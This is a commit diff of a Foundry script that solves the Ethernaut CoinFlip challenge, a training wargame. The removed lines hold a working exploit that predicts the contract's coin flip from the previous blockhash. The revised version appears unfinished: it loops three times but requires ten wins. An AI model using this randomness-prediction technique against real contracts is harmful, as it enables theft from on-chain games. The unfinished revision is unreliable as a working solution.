6431fe10e34b9f43bdbada0220c9e19334ea7354
Miguel Palhas <mpalhas@gmail.com>
2022-06-09 17:06:44 +0100

    code review

--- scripts/ethernaut/03-coin-flip.t.sol
+++ scripts/ethernaut/03-coin-flip.t.sol
@@ -8,18 +8,28 @@ interface ICoinFlip {
     function flip(bool _guess) external returns (bool);
 }
 
-contract AutoFlipper {
-    ICoinFlip flipper;
+contract Ethernaut03 is Ethernaut {
+    address constant factory =
+        address(0x4dF32584890A0026e56f7535d0f2C6486753624f);
+
     uint256 FACTOR =
         57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
-    constructor(ICoinFlip _flipper) {
-        flipper = _flipper;
-    }
+    function run() public {
+        // vm.startBroadcast();
+        ICoinFlip flip = ICoinFlip(createNewInstance(factory));
 
-    function flip() external {
-        console.log("guess", guess());
-        flipper.flip(guess());
+        for (uint256 i = 0; i < 3; ++i) {
+            console.log(block.number);
+            console.logBytes32(blockhash(block.number - 1));
+            flip.flip(true);
+
+            vm.roll(block.number + 1);
+        }
+
+        require(flip.consecutiveWins() == 10, "not won");
+        submit(factory, address(flip));
+        // vm.stopBroadcast();
     }
 
     function guess() private returns (bool) {
@@ -27,25 +37,5 @@ contract AutoFlipper {
 
         uint256 coinFlip = blockValue / FACTOR;
         return coinFlip == 1 ? true : false;
-    }
-}
-
-contract Ethernaut03 is Ethernaut {
-    address constant factory =
-        address(0x4dF32584890A0026e56f7535d0f2C6486753624f);
-
-    function run() public {
-        vm.startBroadcast();
-        ICoinFlip flip = ICoinFlip(createNewInstance(factory));
-
-        AutoFlipper autoFlipper = new AutoFlipper(flip);
-        for (uint256 i = 0; i < 10; ++i) {
-            console.log(block.number);
-            autoFlipper.flip();
-        }
-
-        require(flip.consecutiveWins() == 10, "not won");
-        submit(factory, address(flip));
-        vm.stopBroadcast();
     }
 }
